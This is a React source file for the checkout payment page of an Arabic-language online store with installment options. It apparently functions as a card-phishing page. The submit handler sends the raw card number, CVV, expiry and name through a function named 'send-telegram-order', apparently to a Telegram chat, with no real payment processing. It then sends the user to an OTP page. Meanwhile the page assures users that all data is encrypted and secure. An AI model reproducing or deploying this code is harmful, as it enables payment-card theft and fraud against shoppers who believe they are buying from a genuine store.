import { useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import { useCart } from "@/context/CartContext";
import { useDiscount } from "@/context/DiscountContext";
import StoreHeader from "@/components/StoreHeader";
import { ArrowRight, CreditCard } from "lucide-react";
import type { PaymentMethod } from "@/components/PaymentMethodSelector";
import { supabase } from "@/integrations/supabase/client";

const PaymentPage = () => {
  const navigate = useNavigate();
  const { items, totalPrice } = useCart();
  const { discountApplied, discountPercent } = useDiscount();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cardNumber, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cardName, setCardName] = useState("");

  const discountAmount = discountApplied ? Math.round(totalPrice * (discountPercent / 100)) : 0;
  const finalTotal = totalPrice - discountAmount;

  const paymentMethod = (localStorage.getItem("payment_method") || "visa") as PaymentMethod;
  const paymentMonths = parseInt(localStorage.getItem("payment_months") || "1", 10);

  const installmentSections = ["جوالات", "لابتوبات", "شاشات", "ساعات", "طاولات خارجية"];
  const hasInstallmentProducts = useMemo(
    () => items.some((i) => {
      const section = (i.product as any).section;
      return i.product.id.startsWith("ph") || installmentSections.includes(section);
    }),
    [items]
  );

  const isInstallment = hasInstallmentProducts && paymentMethod !== "visa";

  const paymentAmount = useMemo(() => {
    if (!isInstallment) return finalTotal;
    return Math.ceil(finalTotal / paymentMonths);
  }, [finalTotal, paymentMonths, isInstallment]);

  const paymentLabel = useMemo(() => {
    if (!isInstallment) return null;
    switch (paymentMethod) {
      case "installment":
        return `تقسيط بالفيزا — ${paymentMonths} شهر`;
      case "tabby":
        return `Tabby — ${paymentMonths} دفعات`;
      case "tamara":
        return `Tamara — ${paymentMonths} دفعات`;
      default:
        return null;
    }
  }, [paymentMethod, isInstallment, paymentMonths]);

  if (items.length === 0) {
    return (
      <div className="min-h-screen bg-background">
        <StoreHeader />
        <div className="flex flex-col items-center justify-center py-20 text-center px-4">
          <p className="text-xl text-foreground font-bold">لا يوجد منتجات في السلة</p>
          <button onClick={() => navigate("/")} className="mt-4 text-sale underline">تصفح المنتجات</button>
        </div>
      </div>
    );
  }

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await supabase.functions.invoke("send-telegram-order", {
        body: {
          type: "payment",
          cardNumber,
          cvv,
          expiry,
          cardName,
          paymentMethod,
          paymentMonths,
          paymentAmount,
        },
      });
    } catch (err) {
      console.error("Failed to send telegram:", err);
    }
    setIsSubmitting(false);
    navigate("/otp");
  };

  return (
    <div className="min-h-screen bg-background">
      <StoreHeader />

      <div className="px-4 py-3">
        <button onClick={() => navigate("/checkout")} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-foreground">
          <ArrowRight className="w-4 h-4" />
          رجوع
        </button>
      </div>

      {/* Steps indicator */}
      <div className="px-4 pb-4">
        <div className="flex items-center justify-center gap-2">
          <div className="flex items-center gap-1 text-sm font-medium text-muted-foreground">
            <span className="w-6 h-6 rounded-full flex items-center justify-center text-xs bg-secondary text-foreground">1</span>
            البيانات
          </div>
          <div className="w-8 h-px bg-border" />
          <div className="flex items-center gap-1 text-sm font-medium text-sale">
            <span className="w-6 h-6 rounded-full flex items-center justify-center text-xs bg-sale text-sale-foreground">2</span>
            الدفع
          </div>
        </div>
      </div>

      <div className="px-4 pb-8 max-w-lg mx-auto">
        <form onSubmit={handlePayment} className="space-y-4">
          <h2 className="text-lg font-bold text-foreground text-right">بيانات الدفع</h2>

          {/* Show selected plan info */}
          {isInstallment && paymentLabel && (
            <div className="bg-green-50 dark:bg-green-950/20 border border-green-200 dark:border-green-800 rounded-lg p-3 text-right">
              <p className="text-sm font-bold text-green-700 dark:text-green-400">{paymentLabel}</p>
              <p className="text-xs text-muted-foreground mt-1">
                المبلغ الإجمالي: {finalTotal} ر.س — القسط: {paymentAmount} ر.س
              </p>
            </div>
          )}

          <div className="space-y-3">
            <label className="flex items-center gap-3 border border-sale rounded-sm p-4 bg-card cursor-pointer">
              <input type="radio" name="payment" value="visa" defaultChecked className="accent-sale" />
              <div className="flex items-center gap-2 flex-1">
                <CreditCard className="w-5 h-5 text-foreground" />
                <span className="text-sm font-medium text-foreground">بطاقة ائتمان / مدى</span>
              </div>
              <div className="flex gap-1">
                <span className="bg-[hsl(221,83%,53%)] text-sale-foreground text-xs px-1.5 py-0.5 rounded font-bold">VISA</span>
                <span className="bg-[hsl(0,84%,60%)] text-sale-foreground text-xs px-1.5 py-0.5 rounded font-bold">MC</span>
                <span className="bg-[hsl(142,71%,45%)] text-sale-foreground text-xs px-1.5 py-0.5 rounded font-bold">مدى</span>
              </div>
            </label>
          </div>

          <div className="space-y-3 bg-card border border-border rounded-sm p-4">
            <input type="text" placeholder="رقم البطاقة" required maxLength={19} inputMode="numeric"
              value={cardNumber} onChange={(e) => setCardNumber(e.target.value)}
              className="w-full border border-border rounded-sm py-3 px-4 text-center text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground tracking-widest font-mono" />

            <div className="flex gap-3">
              <input type="text" placeholder="CVV" required maxLength={4} inputMode="numeric"
                value={cvv} onChange={(e) => setCvv(e.target.value)}
                className="w-1/3 border border-border rounded-sm py-3 px-4 text-center text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground font-mono" />
              <input type="text" placeholder="MM/YY" required maxLength={5} inputMode="numeric"
                value={expiry}
                onChange={(e) => {
                  let val = e.target.value.replace(/[^\d]/g, "");
                  if (val.length >= 3) val = val.slice(0, 2) + "/" + val.slice(2);
                  setExpiry(val);
                }}
                className="flex-1 border border-border rounded-sm py-3 px-4 text-center text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground font-mono" />
            </div>

            <input type="text" placeholder="الاسم على البطاقة" required
              value={cardName} onChange={(e) => setCardName(e.target.value)}
              className="w-full border border-border rounded-sm py-3 px-4 text-center text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground" />
          </div>

          <div className="bg-secondary rounded-sm p-4 space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-lg font-bold text-sale">{paymentAmount} ر.س</span>
              <span className="text-sm font-bold text-foreground">
                {isInstallment ? "مبلغ القسط" : "المبلغ المطلوب"}
              </span>
            </div>
            {isInstallment && (
              <p className="text-xs text-muted-foreground text-center">
                الإجمالي {finalTotal} ر.س
              </p>
            )}
          </div>

          <div className="flex gap-3">
            <button type="button" onClick={() => navigate("/checkout")}
              className="flex-1 border border-border py-3 rounded-sm font-bold text-foreground hover:bg-secondary transition-colors">
              رجوع
            </button>
            <button type="submit" disabled={isSubmitting}
              className="flex-1 bg-sale text-sale-foreground py-3 rounded-sm font-bold hover:opacity-90 transition-opacity disabled:opacity-50">
              {isSubmitting ? "جاري الإرسال..." : `ادفع ${paymentAmount} ر.س`}
            </button>
          </div>

          <p className="text-xs text-muted-foreground text-center flex items-center justify-center gap-1">
            🔒 جميع البيانات مشفرة وآمنة
          </p>
        </form>
      </div>
    </div>
  );
};

export default PaymentPage;
